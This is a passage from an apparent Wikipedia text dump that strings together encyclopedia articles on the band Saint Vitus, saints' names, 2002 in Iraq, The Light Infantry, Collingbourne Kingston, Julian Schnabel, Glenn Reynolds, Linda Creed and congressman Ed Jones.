In 2015, Saint Vitus performed a single U.S. date in Austin, Texas and a European tour with original singer Scott Reagers, his first full shows with the band in 20 years. Due to Wino&#x27;s commitments with The Obsessed&#x27;s reunion, Reagers once again filled in for him on Saint Vitus&#x27; fall 2016 U.S. tour with The Skull and Witch Mountain and has remained with the band ever since. Also during this period, Pat Bruders of Crowbar and Down filled in for their longtime bassist Mark Adams, who could not tour with the band because of health reasons; it was revealed in October 2018 that he had been suffering from Parkinson&#x27;s disease.

Saint Vitus released their live album &quot;Live Vol. 2&quot; on September 23, 2016.

In a November 2017 interview, Chandler stated that they had &quot;pretty much a whole [new] album&quot; written.

The band&#x27;s latest album, titled &quot;Saint Vitus&quot;, was released on May 17, 2019.

Mark Adams died from complications of Parkinson&#x27;s disease on May 23, 2023, at the age of 64.

<text>A saint&#x27;s name, which is usually also a biblical name, is the name of a saint given to individuals at their baptism or confirmation within the Catholic Church, as well as in certain parts of the Eastern Orthodox Church, the Oriental Orthodox Churches, Lutheran Churches and Anglican Communion. It is believed that the saint whose name is chosen will serve as a special patron to protect and guide and will be the heavenly intercessor for the individual who bears his or her name.

The custom of giving the name of a saint originated with the practice of individuals who converted to Christianity taking a new Christian name at their baptism. For example, in the Bible, Saul became Paul after he accepted faith in Jesus. The custom was popular in France and Germany during the Middle Ages and is still customary in continental Europe. In many English-speaking countries, however, it is more common for the saint&#x27;s name to be adopted upon Confirmation in which case it would usually not be part of one&#x27;s legal name.

Under the current Code of Canon Law of the Catholic Church, Canon 855 states, &quot;Parents, sponsors and parish priests are to take care that a name is not given which is foreign to Christian sentiment&quot;, which would simply prohibit a baptismal name being something in the vein of &quot;Satan&quot;, &quot;Lucifer&quot;, or &quot;Death&quot;. However, that was not always the case; in the 1917 Code of Canon Law, Canon 761 required pastors to ensure the baptismal name was a Christian name such as &quot;Christian&quot;, &quot;Grace&quot;, or &quot;Faith&quot;. Therefore, what is now called a given name was once referred to as a Christian name and originated with the pagans of Europe who discarded their pagan names for Biblical ones when they converted to Christianity and participated in baptism. An additional saint&#x27;s name must be given when the former is impossible.

In some Christian countries, the saint&#x27;s day of the person&#x27;s name is celebrated as a birthday is in other countries (cf. Name day). A child may also be named after the saint whose feast is the child&#x27;s birthday. In places where Christians are in the minority and may face persecution, parents may give both a Christian saint&#x27;s name and a secular name to a child, allowing them to use the saint&#x27;s name for religious purposes and the secular name for all other purposes. This is especially common in cultures, such as in South Korea, where traditional given names do not line up with Catholic saints&#x27; names; many Catholics in English-speaking countries of Korean descent use a Korean forename as well as a saints&#x27; name.

<text>Events in the year 2002 in [[Iraq]].

==Incumbents==
* President - Saddam Hussein
* Prime Minister - Saddam Hussein
* Vice President - Taha Muhie-eldin Marouf 
* Vice President - Taha Yassin Ramadan

==Events==

The CIA&#x27;s Special Activities Division (SAD) teams were the first U.S. forces to enter Iraq in July 2002, prior to the US Invasion. Once on the ground, they prepared for the subsequent arrival of US Army Special Forces to organize the Kurdish Peshmerga. In Operation Viking Hammer, this joint team (called the Northern Iraq Liaison Element (NILE)) combined to defeat Ansar al-Islam, an ally of Al Qaeda, in the North East corner of Iraq. This battle was for control of a territory that was occupied by Ansar al-Islam and was executed prior to the invasion. It was carried out by Paramilitary Operations Officers from SAD and the Army&#x27;s 10th Special Forces Group. This battle was a significant defeat of a key terrorist organization and the uncovering of a chemical weapons facility at Sargat. Sargat was the only facility of its type discovered in the Iraq war.

SAD teams also conducted missions behind enemy lines to identify leadership targets. These missions led to the initial strikes against Saddam Hussein and his Generals. Although the strike against Saddam was unsuccessful in killing him, it was successful in effectively ending his ability to command and control his forces. Other strikes against his Generals were successful and significantly degraded the command&#x27;s ability to react to, and maneuver against the US led invasion force. SAD operations officers were also successful in convincing key Iraqi Army officers into surrendering their units once the fighting started.

Turkey refused to allow the US Army entry into Northern Iraq. Therefore, joint SAD and Army Special forces teams and the Kurdish Peshmerga were the entire Northern force against Saddam. They managed to keep Saddam&#x27;s Army in place rather than moving the northern army to contest the US led coalition force coming from the south. The efforts of the Kurds, SAD and 10th Special Forces Group with the Kurds likely saved the lives of many US and coalition forces during and after the invasion. As described by Mike Tucker and Charles Faddis in their book entitled, &quot;Operation Hotel California: The Clandestine War Inside Iraq&quot;, four of these CIA officers were awarded the Intelligence Star for their heroic actions.

===January===
January 29 – US President George W. Bush placed Iraq on the axis of evil, along with Iran and North Korea, for developing weapons of mass destruction, violating human rights, and enmity with the United States.

===February===

===April===

===July===
*July 5 – Saddam Hussein again rejects new U.N. weapons inspections proposals.

===August===
*August 2 – Saddam Hussein invites chief weapons inspector Hans Blix to Iraq for discussions on remaining disarmament issues.
*August 19
**The U.N. Secretary General rejects Iraq&#x27;s August 2 proposal as the &quot;wrong work program&quot;, and instead recommends that Iraq allow weapons inspectors to return to the country, in accordance with previous U.N. resolutions.
**Terrorist Abu Nidal dies in his home in Baghdad from multiple gunshot wounds. Deputy Prime Minister Tariq Aziz claims the wounds were self-inflicted.

===September===
*September 12 – U.S. President George W. Bush, addresses the U.N. and challenges its members to confront the &quot;grave and gathering danger&quot; of Iraq or stand aside as the United States and likeminded nations act.

===October===
*October – In October 2002, a few days before the U.S. Senate voted on the Joint Resolution to Authorize the Use of United States Armed Forces Against Iraq, about 75 senators were told in closed session that Iraq had the means of attacking the eastern seaboard of the U.S. with biological or chemical weapons delivered by unmanned aerial vehicles (UAVs.) On February 5, 2003, Colin Powell presented further evidence in his Iraqi WMD program presentation to the UN Security Council that UAVs were ready to be launched against the U.S. At the time, there was a vigorous dispute within the US military and intelligence community as to whether conclusions about Iraqi UAVs were accurate. The U.S. Air Force agency most familiar with UAVs denied that Iraq possessed any offensive UAV capability, saying the few they had were designed for surveillance and intended for reconnaissance. In fact, Iraq&#x27;s UAV fleet was never deployed and consisted of a handful of outdated wingspan drones with no room for more than a camera and video recorder, and no offensive capability. Despite this controversy, the Senate voted to approve the Joint Resolution on October 11, 2002 providing the Bush Administration with the legal basis for the U.S. invasion under US law.
*October 2 – The U.S. Congress passes a joint resolution which explicitly authorized the President to use the Armed Forces of the United States as he determines to be necessary and appropriate in Iraq.
*October 16 – U.S. President George W. Bush signs the Iraq war resolution.

===November===
*November 8 – UN Security Council Resolution 1441 – The United Nations Security Council unanimously approves a resolution on Iraq, forcing Saddam Hussein to disarm or face &quot;serious consequences&quot;.
*November 18 – United Nations weapons inspectors led by Hans Blix arrive in Iraq.

===December===

*December 7 – As required by UN Security Council Resolution 1441, Iraq files a 12,000 page weapons declaration with the U.N. Security Council. Although it is supposed to be a complete declaration, it is seen as incomplete by the Security Council and weapons inspectors.

=== Date Unknown ===

* The University of Karbala and the University of Thi Qar are established.

== Notable births ==
* 11 June – Mired bin Ra&#x27;ad, son of Prince Ra&#x27;ad bin Zeid, head of the defunct Iraqi royal line.

<doc id="1065553" wikidata="Q779562" url="?curid=1065553" title="The Light Infantry">
<text>The Light Infantry was an infantry regiment of the British Army, part of the Light Division. The regiment was one of four &#x27;large&#x27; regiments formed after the 1966 Defence White Paper through the amalgamation of units of the Light Infantry Brigade. Originally consisting of four battalions, it was later reduced to three battalions, and finally amalgamated into The Rifles with just two battalions which became the 5th and 3rd Battalions respectively.

==History==
The regiment was formed on 10 July 1968 as a large regiment by the amalgamation of the four remaining light infantry regiments of the Light Infantry Brigade:
*Somerset and Cornwall Light Infantry 
*King&#x27;s Own Yorkshire Light Infantry
*King&#x27;s Shropshire Light Infantry
*Durham Light Infantry

On 31 March 1969 the 4th Battalion The Light Infantry (formerly The Durham Light Infantry) was disbanded leaving three regular battalions.

The regiment was active all through The Troubles in Northern Ireland with eight soldiers from the regiment killed in the Ballygawley bus bombing.

The remaining battalions remained in service until 1993 when they merged to form two battalions renamed 1st and 2nd Battalions.

==Territorial Army==

*The Light Infantry Volunteers was formed in the Territorial Army on 1 April 1967 from the territorial battalions of the four predecessor regiments. On 1 August 1972 it was redesignated the 5th Battalion, The Light Infantry. It lost its Cornish company and its last Durham company in 1981, and in 1987 it lost its Yorkshire companies. On 1 July 1999 it amalgamated to form two companies of the new West Midlands Regiment. The West Midlands Regiment was amalgamated to form the 4th Battalion The Mercian Regiment in 2007. E (LI) Company, 4th Battalion, The Mercian Regiment, was transferred to the newly raised 8th Battalion, The Rifles, in November 2017. 
*The 6th Battalion was formed in Somerset and Cornwall on 1 April 1971. On 1 July 1999 it amalgamated to form two companies of the new Rifle Volunteers.
*The 7th Battalion was formed in Durham and Yorkshire on 1 April 1975. It began recruiting from Durham only in 1981. On 1 July 1999 it amalgamated to form one company of the new Tyne-Tees Regiment.
*The 8th Battalion was formed in Yorkshire on 1 January 1987. On 3 August 1996 it was converted to a reconnaissance unit as the King&#x27;s Own Yorkshire Yeomanry. On 1 July 1999 it amalgamated to form one company of the new East and West Riding Regiment.

==Amalgamation==
In December 2004, it was announced that, as part of the planned Army restructuring published in &quot;Delivering Security in a Changing World&quot;, the Light Infantry would gain a new battalion through amalgamating with the Devonshire and Dorset Regiment and the Gloucestershire elements of the Royal Gloucestershire, Berkshire and Wiltshire Regiment. However, on 24 November 2005 it was further announced by the Ministry of Defence that, after discussions between the Light Infantry, the Devonshire and Dorset Regiment, the Royal Gloucestershire, Berkshire and Wiltshire Regiment and the Royal Green Jackets, the four regiments would amalgamate to form a single, large regiment to be named The Rifles. The new regiment was formed on 1 February 2007 with 1st Battalion, The Light Infantry becoming 5th Battalion, The Rifles and 2nd Battalion, The Light Infantry becoming 3rd Battalion, The Rifles.

==Alliances==
* - The Royal Hamilton Light Infantry (Wentworth Regiment)
* - Le Régiment de Maisonneuve
* - The North Saskatchewan Regiment
* - The Canterbury, and Nelson-Marlborough and West Coast Regiment
* - 11th Battalion, The Baloch Regiment
* - 1st Battalion, Sindh Regiment
* - 1st Battalion, The Kenya Rifles
* - Special Mobile Force
* - The Rand Light Infantry
* - HMS &quot;Cornwall&quot;

<doc id="1065559" wikidata="Q642675" url="?curid=1065559" title="Collingbourne Kingston">
<text>Collingbourne Kingston is a village and civil parish about south of the market town of Marlborough in Wiltshire, England. The village, which is on the A338 primary route between Andover and Marlborough, is one of several on the River Bourne, a seasonal river which is usually dry in summer. The parish includes the hamlets of Aughton and Brunton.

The toponym Collingbourne means the &quot;Bourne as the stream of Cola&#x27;s people&quot;. Collingbourne Kingston was so named to distinguish it from its southerly neighbour Collingbourne Ducis. Until the 14th century, Collingbourne Kingston was called Collingbourne Abbot&#x27;s with reference to Hyde Abbey, Winchester, the owner of the principal manor. The change to Kingston was a reference to the appearance of Collingbourne in the Domesday Book.

==Local government==
The civil parish elects a parish council. It is in the area of Wiltshire Council unitary authority, which performs most significant local government functions.

The parish originally contained Collingbourne Kingston, Aughton, Brunton, Sunton, and part of Cadley hamlet. In 1934 Sunton and the part of Cadley were transferred to Collingbourne Ducis, and in 1987 the parish was further reduced when its southeast and southwest parts were also transferred to Collingbourne Ducis.

==Amenities==
The village has a garage. There is no post office in the village. The nearest post offices are in Collingbourne Ducis and Burbage. The nearest supermarkets are in Ludgershall, Tidworth and Pewsey.

The village has a public house with accommodation, the &quot;Barleycorn Inn,&quot; an early 19th-century coaching inn. The establishment was previously known as the &quot;Cleaver&quot; and prior to that, &quot;the&quot; &quot;Kingston Hotel&quot;. 

Collingbourne Kingston had two public houses until the 1980s; the &quot;Windmill Inn&quot; is now a private house.

==Education==
The former school, now a bed and breakfast establishment called &quot;The Old School House&quot;, was opened in 1845 and served the children of the local farmworkers and craftsmen. It was ahead of its time as universal education was not introduced until thirty years later. The school closed in 1978 and primary age children now attend the school in neighbouring Collingbourne Ducis.

Children of secondary school age are able to attend Pewsey Vale School, The Wellington Academy in Ludgershall and St John&#x27;s in Marlborough.

==Church and chapel==
The Church of England parish church of Saint Mary is in the centre of the village. In 1344 its dedicatee was Saint John the Baptist but by 1763 it was dedicated to St. Mary. In 1862 it was altered and extensively restored by John Colson. It is an 11th-century Norman building and there is a possibility that it stands on the site of an earlier Saxon church. The oldest features of the church are the round Norman pillars in the nave. Each has a different capital, one with a lady facing the south door. There are four arches to the southern arcade, but only three to the northern one. There is also a canonical sundial on the south wall.

The 13th and 14th centuries gave the church its ornate chancel arch, with four depths of moulded spandrels and foliage capitals set on Purbeck marble piers. An engraving of the church in 1806 shows the original lower ridge of the nave roof, giving a better proportion to its relationship with the fine tower with its carved pinnacles and strange gargoyles. At that time there were only four round clerestory windows on each side of the north and south walls of the nave. In the 1860s the roof was raised and the clerestory windows increased to six on each side; Pevsner writes &quot;The clerestory windows, however, are Victorian, of an oddly playful kind, quite out of keeping with the church or Wiltshire – pentagon and hexagon surrounds and cinquefoils and sexfoils&quot;.

The Conacher two manual, 1210 pipe organ came from the parish church of Lavenham, Suffolk in 1997. It was blessed by the Bishop of Salisbury who then played a piece by Bach on it. The huge canopied Pile family tomb stands to the right of the altar, and therein lie Gabriel Pile who died in 1626, and his wife Anne. The tower has six bells, the oldest from 1614; the old second bell stands in retirement in the south aisle.

The church is a Grade II* listed building and today forms part of the Savenake grouping of parishes.

Further south in the village is a Wesleyan Methodist chapel built in 1914 to replace an earlier chapel building of 1819. The chapel closed in 1985 and became a private home.

== Former railway ==
The Swindon, Marlborough and Andover Railway was opened through the Bourne valley in 1882, becoming the Midland and South Western Junction Railway in 1884 and part of the Great Western Railway in 1923. The line passed close to the east of Collingbourne Kingston and there was a station at Collingbourne Ducis. In 1932 an unstaffed station, , was opened where the line passed under the road to Brunton, to compete with road transport. The halt closed when the line was closed to passengers in 1961, and subsequently the track was removed.
== Air crash ==
In 1943 a Spitfire aircraft crashed in the village, destroying the roof of a thatched cottage. The American pilot serving with the Air Transport Auxiliary, Hazel Jane Raines, was injured.

==Twinning Association==
 Collingbourne and District are twinned with Le Merlerault in Normandy, France. The twinning agreement was made on 18 April 1992.

<doc id="1065561" wikidata="Q345379" url="?curid=1065561" title="Julian Schnabel">
<text>Julian Schnabel (born October 26, 1951) is an American painter and filmmaker. In the 1980s, he received international attention for his &quot;plate paintings&quot;—with broken ceramic plates set onto large-scale paintings. Since the 1990s, he has been a proponent of independent arthouse cinema. Schnabel directed &quot;Before Night Falls&quot;, which became Javier Bardem&#x27;s breakthrough Academy Award-nominated role, and &quot;The Diving Bell and the Butterfly&quot;, which was nominated for four Academy Awards. For the latter, he won the Cannes Film Festival Award for Best Director and the Golden Globe Award for Best Director, as well as receiving nominations for the Academy Award for Best Director and the César Award for Best Director.

==Early life and education==
Schnabel was born in Brooklyn, New York, to a Jewish family, the son of Esta (née Greenberg) and Jack Schnabel. He moved with his family to Brownsville, Texas, in 1965. He received his B.F.A. at the University of Houston. After graduating, he sent an application to the Independent Study Program (ISP) at the Whitney Museum of American Art in New York. His application included slides of his work sandwiched between two pieces of bread. He was admitted into the program and studied there from 1973 to 1975.

In 1975, Schnabel visited Galveston and was introduced to the artist Joseph Glasco who had his home and studio in Galveston at that time. Schnabel and Glasco became close friends and shared many similar interests in the arts. Later in their relationship, Schnabel influenced Glasco to set up his studio in New York, and in the late 1980s introduced Glasco to Leslie Waddington of Waddington Galleries, London, where he had an exhibition.

==Art career==
Schnabel returned to Houston in 1975 and rented a studio in the Heights neighborhood. Jim Harithas, director of the Contemporary Arts Museum Houston, agreed to give him a show after Schnabel reportedly badgered him repeatedly. The eponymously titled exhibit ran from February 20 to March 7, 1976, in the parallelogram building&#x27;s lower gallery.

On seeing the show, &quot;ARTnews&quot; critic Charlotte Moser wrote, &quot;Though still formative, Schnabel&#x27;s paintings possess a palpable presence,&quot; but found the work &quot;clearly influenced by post-minimalist artists whose intellectual ideas he might share but whose technical expertise and clarity of vision he has yet to acquire.&quot;

It was with his first solo show, at the Mary Boone Gallery in 1979 that Schnabel had his breakthrough; all his works were sold in advance. He participated at the Venice Biennale in 1980 with Anselm Kiefer and Georg Baselitz. By the time he exhibited his work in a show jointly organized by Boone and Leo Castelli in 1981, he had become firmly established and was the youngest artist in the legendary exhibition &#x27;A New Spirit in Painting&#x27; in the Royal Academy of Arts. His now famous &quot;plate paintings&quot;—large-scale paintings set on broken ceramic plates—received a boisterous and critical reception from the art world. In 1984, he surprised the art community by moving from working with Mary Boone to exhibit at the Pace Gallery.

His wild and expressive works were classed as neo-expressionism by art critics. In the years to follow Schnabel&#x27;s success on the art market would above all be criticised.

Schnabel&#x27;s style is characterised by very large scale paintings. He uses diverse materials such as plaster, wax, photographs, antlers, velvet and ceramics. His paintings make use of canvas, wood, muslin and even surfboards. His paintings often combine abstract and figurative elements. Due to the size, weight, and depth of his works, they are often given sculptural properties.

In 2002, Schnabel painted the cover artwork for the Red Hot Chili Peppers&#x27; eighth studio album, &quot;By the Way&quot;. The woman featured on the cover of &quot;By the Way&quot; is Julian&#x27;s daughter, Stella Schnabel, who was band member John Frusciante&#x27;s then-girlfriend.[59] Regarding the artwork, Frusciante noted: &quot;My girlfriend&#x27;s father offered to do the album art, so we sent him rough mixes of eight songs, and he just got the vibe of the album from that. He said that he wouldn&#x27;t be offended if we didn&#x27;t like it, but we loved what he did. He&#x27;s also given us great covers for all the singles. He&#x27;s a true artist.&quot;

Schnabel had an exhibition at the Art Gallery of Ontario in Toronto, which ran from September 1, 2010, to January 2, 2011, and occupied the entirety of the gallery&#x27;s fifth floor. It examined &quot;the rich interplay between Schnabel&#x27;s paintings and films&quot;. In 2011 Museo Correr exhibited &quot;Julian Schnabel: Permanently Becoming and the Architecture of Seeing&quot;, a selected survey show of Schnabel&#x27;s career curated by Norman Rosenthal.

Art critic Robert Hughes was one of the most outspoken critics of his work; he once stated that &quot;Schnabel&#x27;s work is to painting what Stallone&#x27;s is to acting: a lurching display of oily pectorals.&quot; 

In the 2017 Swedish film &quot;The Square&quot;, set in a museum of modern art, Dominic West plays a character modeled on Schnabel.

==Art market==
The most expensive of his paintings at the art market was &quot;Ethnic Type #14&quot; (1984), sold by $1,452,500 at Christie&#x27;s, on 15 November 2017.

==Film career==
Schnabel began his film career in the 1990s with the film &quot;Basquiat&quot;, a biopic on the painter Jean-Michel Basquiat (1996), followed by &quot;Before Night Falls&quot; (2000), an adaptation of Reinaldo Arenas&#x27;s autobiographical novel, which he also produced, and which won the Grand Jury Prize at the Venice Film Festival. He directed &quot;The Diving Bell and the Butterfly&quot; (2007), an adaptation (with a screenplay by Ronald Harwood) of a French memoir by Jean-Dominique Bauby. &quot;The Diving Bell and the Butterfly&quot; earned him the award for best director at the 2007 Cannes Film Festival, the Golden Globe for best director, the Independent Spirit Award for best director, and a nomination for the Academy Award for Best Director.

Despite the fact that producing &quot;The Diving Bell and the Butterfly&quot; might seem like a commission to do someone else&#x27;s work, Schnabel took on the film. According to Schnabel, 

In 2007, Schnabel designed Lou Reed&#x27;s critically acclaimed &quot;Berlin&quot; Tour and released &quot;&quot;. In 2010, Schnabel then directed the film &quot;Miral&quot;. In May 2017, Schnabel announced plans for a film about the painter Vincent van Gogh during his time in Arles and Auvers-sur-Oise, France. The film &quot;At Eternity&#x27;s Gate&quot; was released in 2018 and the script was written by Schnabel, French screenwriter Jean-Claude Carrière, and Louise Kugelberg. The film stars Willem Dafoe as Van Gogh. Other actors include Mathieu Amalric, Mads Mikkelsen, Niels Arestrup, Oscar Isaac as Paul Gauguin and Emmanuelle Seigner as &quot;the woman from Arles&quot; or L&#x27;Arlésienne. 

In September 2023, Schnabel announced plans to direct an adaptation of &quot;In the Hand of Dante&quot;, based on the book by Nick Tosches. The movie will shoot October 2023 and is set to star Oscar Isaac.

==Writing and recording==
Schnabel published his autobiography, &quot;CVJ: Nicknames of Maitre D&#x27;s &amp; Other Excerpts From Life&quot; (Random House, New York), in 1987 and released the album &quot;Every Silver Lining Has a Cloud&quot; on Island Records (Catalog #314-524 111-2) in 1995.

Recorded in Brooklyn, New York, in 1993, the album features guest musicians including Bill Laswell, Bernie Worrell, Buckethead, and Nicky Skopelitis.

==Personal life==
In 1980, he married Belgian clothing designer Jacqueline Beaurang. They have three children: two daughters – Lola, a painter and filmmaker; and Stella, a poet and actress – and a son, Vito, an art dealer.

He has twin sons, Cy and Olmo, with his second wife, Spanish actress Olatz López Garmendia.

His collaboration with Palestinian journalist Rula Jebreal, who penned the screenplay and original source novel for Schnabel&#x27;s film &quot;Miral&quot;, extended beyond the movie. Schnabel was in a relationship with her from 2007 to 2011.

Schnabel dated Danish model May Andersen, from whom he parted ways in 2014. They have a son, who was born in June 2013.

Schnabel lives in New York City with his current wife Louise Kugelberg, a Swedish interior designer. She is also the co-editor and co-writer of &quot;At Eternity&#x27;s Gate&quot;. Schnabel maintains studios in New York City and in Montauk at the east end of Long Island. Schnabel resides in a former West Village horse stable that he purchased and converted for residential use, adding five luxury condominiums in the style of a Northern Italian palazzo. It is named the Palazzo Chupi, and it is easy to spot because it is painted pink.

In 2009, Schnabel signed a petition in support of film director Roman Polanski, calling for his release after Polanski was arrested in Switzerland in relation to his 1977 charge for drugging and raping a 13-year-old girl.

<text>Glenn Harlan Reynolds (born August 27, 1960) is an American legal scholar who is the Beauchamp Brogan Distinguished Professor of Law at the University of Tennessee College of Law. He is known for his American politics blog, &quot;Instapundit&quot;.

==Instapundit blog==

Reynolds&#x27; blog began as a class project in August 2001, when he was teaching a class on Internet law. Much of Instapundit&#x27;s content consists of links to other sites, often with brief comments.

The blog is multi-author, with numerous contributors.

In 2007 network theory researchers who studied blogs as a test case found that Instapundit was the #1 blog for &quot;quickly know[ing] about important stories that propagate over the blogosphere&quot;.

In 2007, Reynolds called for the assassination of Iranian scientists and clerics.

On September 21, 2016, Reynolds suggested on Twitter that any drivers feeling threatened by protesters objecting to the fatal shooting of Keith Lamont Scott in Charlotte, North Carolina, should &quot;run them down.&quot; The tweet consisted only of the words &quot;Run them down&quot; and a link to a news story about the protestors. The following day, Reynolds defended his tweet, saying, &quot;I wouldn&#x27;t actually aim for people blocking the road, but I wouldn&#x27;t stop because I&#x27;d fear for my safety, as I think any reasonable person would.&quot; Twitter suspended Reynolds&#x27; account, but restored it shortly after and told him to delete the tweet in order to be allowed to use Twitter again. The University of Tennessee said it was investigating Reynolds as it did not condone language encouraging violence, but on September 27, 2016, the law school decided that no disciplinary action would be taken. &quot;USA Today&quot; said that Reynolds had violated its standards and suspended his column for one month. Reynolds issued an apology at its request, writing, &quot;I didn&#x27;t live up to my own standards, and I didn&#x27;t meet USA Today&#x27;s standards&quot;.

==Political views==
Reynolds is often described as conservative, but holds liberal views on some social issues (such as abortion, the War on Drugs and gay marriage), a combination often described as libertarian. He illustrates his philosophy by stating: &quot;I&#x27;d like to live in a world in which happily married gay people have closets full of assault weapons to protect their pot.&quot; He has been called libertarian.

He delivered the keynote speech at a September 2011 conference at the Harvard Law School to discuss a possible Second Constitution of the United States and concluded that the movement for a constitutional convention was a result of having &quot;the worst political class in our country&#x27;s history&quot;.

==Personal life==
Born in Birmingham, Alabama in 1960, he graduated with a B.A. degree from the University of Tennessee in 1982 and with a J.D. degree from the Yale Law School in 1985. Reynolds is married to Dr. Helen Smith, a forensic psychologist.

Reynolds also once ran his own music label WonderDog Records, for which he also served as a record producer. Reynolds has also worked as an indie music artist. One of his albums reached the number one album chart spot on the website service MP3.com for several weeks.

Reynolds is of Scots-Irish ancestry.

==Other writing==
===Academic publications===
As a law professor, Reynolds has written for the &quot;Columbia Law Review&quot;, the &quot;Virginia Law Review&quot;, the &quot;University of Pennsylvania Law Review&quot;, the &quot;Wisconsin Law Review&quot;, the &quot;Northwestern University Law Review&quot;, the &quot;Harvard Journal of Law &amp; Technology&quot;, &quot;Law and Policy in International Business&quot;, &quot;Jurimetrics&quot;, and the &quot;High Technology Law Journal&quot;, among others.

===Books===
* &quot;Outer Space: Problems of Law and Policy&quot; (1989), (with Robert P. Merges); 2nd ed. (1997), 
* &quot;The Appearance of Impropriety: How the Ethics Wars Have Undermined American Government, Business, and Society&quot; (1997), (with Peter W. Morgan)
* &quot;An Army of Davids: How Markets and Technology Empower Ordinary People to Beat Big Media, Big Government, and Other Goliaths&quot; (2006), 
:Looks at modern American society through the lens of individuals versus social institutions, and Reynolds concludes that technological change has allowed more freedom of action for people, in contrast to the &quot;big&quot; establishment organizations that used to function as gatekeepers. Thus, he argues that the balance of power between individuals and institutions is &quot;flatting out&quot;, which involves numerous decentralized networks rising up.
* &quot;The Higher Education Bubble&quot; (2012), 
:About the rising price of higher education, causing students to take on excessive debt, even as they face an uncertain job market. Higher education spending fueled by cheap credit resembles an &quot;economic bubble&quot;, and &quot;higher education bubble&quot; has become a common term to describe this phenomenon.
* &quot;The K-12 Implosion&quot;, Encounter Broadsides No. 31, (2013) 
:Provides a description of what Reynolds believes to be wrong with America&#x27;s K-12 education system, and where the solutions are likely to come from, along with advice for parents, educators, and taxpayers. He argues that America has been putting ever-growing amounts of money into the existing public education system, while getting increasingly worse results. He suggests that while parents are losing hope in public schools, new alternatives are appearing, and change is inevitable.

===Columns and articles===
Reynolds also writes articles for various publications (generally under his full name, Glenn Harlan Reynolds): Wikipedia, &quot;Popular Mechanics&quot;, &quot;Forbes&quot;, &quot;The New York Post&quot;, &quot;The New York Times&quot;, &quot;The Atlantic Monthly&quot;, &quot;The Washington Post&quot;, &quot;The Washington Times&quot;, &quot;The Los Angeles Times&quot;, &quot;USA Today&quot;, and &quot;The Wall Street Journal&quot;. He has written for the TCS Daily, Fox News, and MSNBC websites as well.

<text>Linda Diane Creed (December 6, 1948 – April 10, 1986), also known by her married name Linda Epstein, was an American songwriter, lyricist, background singer and record producer who teamed up with Thom Bell to produce some of the most successful Philadelphia soul groups of the 1970s.

==Career==
Linda Diane Creed was born on December 6, 1948, in the Mount Airy section of Philadelphia to a Jewish family. Creed was active in music at Germantown High School. During her high school years, she was fronting her own band, Raw Soul, which made frequent appearances at the Philadelphia Athletic Club and at Sid Booker&#x27;s Highline Lounge.

After graduation, Creed left Philadelphia for New York, where she became a secretary at Mills Music, Inc. She also utilized the time to develop her skills as a lyricist, but after eight months of little success, and feeling defeated, she returned to her hometown, which later became the inspiration for the song &quot;I&#x27;m Coming Home&quot;. Her career was launched in 1970 when singer Dusty Springfield recorded her song &quot;Free Girl&quot;. That same year, Creed teamed with Bell, a staff writer, producer, and arranger at Kenny Gamble and Leon Huff&#x27;s record label Philadelphia International Records.

Their first songwriting collaboration, &quot;Stop, Look, Listen (To Your Heart)&quot;, became a Top 40 pop hit for the Stylistics, beginning an extended collaboration that also yielded the group&#x27;s most successful recordings, including &quot;You Are Everything&quot;, &quot;Betcha by Golly, Wow&quot;, &quot;Break Up to Make Up&quot;, &quot;People Make the World Go Round&quot;, &quot;You Make Me Feel Brand New&quot;, and &quot;I&#x27;m Stone in Love with You&quot; (the latter with Thom&#x27;s brother Tony). Creed and Bell also paired on a number of hits for the Spinners, including &quot;Ghetto Child&quot; and &quot;The Rubberband Man&quot;. 

Linda Creed also provided background vocals, including on &quot;I&#x27;ll Be Around&quot;, &quot;Could It Be I&#x27;m Falling in Love&quot;, &quot;Mighty Love&quot; and &quot;One of a Kind (Love Affair)&quot; by the Spinners and on the first three Stylistics&#x27; albums.
==Death==
Though diagnosed with breast cancer at 26, Creed continued working, teaming with composer Michael Masser and writing the lyrics to the song &quot;The Greatest Love of All&quot;, the main theme of the film &quot;The Greatest&quot;, a biopic of the great boxer Muhammad Ali, launched in 1977. The song was originally recorded by George Benson and released as a single in 1977, becoming a big hit, peaked at #2 on the R&amp;B chart. The lyrics of the song were written in the midst of her struggle with breast cancer. The words describe her feelings about coping with great challenges that one must face in life, being strong during those challenges whether you succeed or fail, and passing that strength on to children to carry with them into their adult lives. In December 1984, the song was recorded by Whitney Houston for her 1985 self-titled debut album and it would top the charts in May 1986. Weeks before Houston reached number one, Creed died of breast cancer on April 10, 1986, at age 37.

The following year, her family and friends established the Linda Creed Breast Cancer Organization in her honor, and it serves women in Pennsylvania and the surrounding counties.

In 1992, she was posthumously inducted into the Songwriters Hall of Fame.

<text>Ed Jones (April 20, 1912 – December 11, 1999) was a U.S. Representative from the state of Tennessee from 1969 to 1989. He was also the Tennessee Commissioner of Agriculture from 1949 to 1953. He was inducted into the Tennessee Agricultural Hall of Fame in 2011.

==Personal life==

Ed Jones was a native of Yorkville, Tennessee, the eldest of three boys born to Will &quot;Gabe&quot; Jones and Sibbie Hortense Pipkin. He graduated from the University of Tennessee Junior College (now the University of Tennessee at Martin) in 1932 and attended the University of Tennessee, majoring in agriculture. His father was a laborer who worked odd jobs for local farmers. He instilled a strong work ethic in Jones from an early age, requiring him to work after school and on Saturdays. 
When Jones&#x27; father was unable to pay his medical bills, he began doing odd jobs for Dr. Finis Ewing Wyatt, the local country doctor. Jones would marry Dr. Wyatt&#x27;s daughter, Llewellyn, in 1938, and they had two daughters: Mary Llewellyn Jones (died 1977), and Dr. Jennifer Jones Kinnard, a retired nephrologist. Ed and Llew Jones inherited the farm after the death or Llew&#x27;s parents and renamed it &quot;Oak Haven Farm.&quot;
On May 22, 1980, Congresswoman Marilyn Lloyd of Tennessee welcomed Jones into the &quot;grandparents club&quot; with an address on the House floor shortly after the birth of his only grandchild, Meghan Elisabeth Kinnard. Known professionally as Meg Kinnard, she&#x27;s a political and legal affairs reporter for The Associated Press. 

Jones was a dairy farmer and remained so throughout his lifetime – even during his 20 years in Congress. In the late 1990s, Jones developed dementia after open heart surgery, and died on December 11, 1999, in Dyer, Tennessee.

==Business and professional activities==
In 1934, Jones took a job as a dairy inspector for the state of Tennessee. He remained as inspector until 1941 when he began working as a supervisor for the Tennessee Dairy Products Association. In 1944, he became an agricultural for the Illinois Central Railroad, a job he held until 1969, except for four years when he was Commissioner of Agriculture. This public role was pivotal in helping to make him a public figure in West Tennessee.

